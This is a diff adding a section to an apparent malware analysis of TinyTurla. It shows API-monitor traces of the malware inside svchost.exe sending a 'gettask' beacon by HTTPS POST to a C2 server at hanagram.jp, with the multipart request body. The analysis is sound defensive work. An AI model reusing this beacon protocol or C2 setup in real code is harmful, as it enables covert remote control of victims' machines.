@@ -84,9 +84,62 @@ Thread created by monitored process : Now monitoring [pid 0x254][tid 0x2d4]
 
 As mentionned in the report the first beaconing contains the "Client Ready" message to signal the C2 that the is malware is up and ready to receive orders.  
 
+---  
 
+With the following 'gettask' message, the malware is offering the C2 an opportunity to reply with an order :  
 
+```html
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803dc0
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A4E50
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
 
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66aad0
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F728
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BD070
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F370140
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BC580
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xaf
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F370140
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43E806620
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="gettask""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F780
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+```
+---  
 
 
 
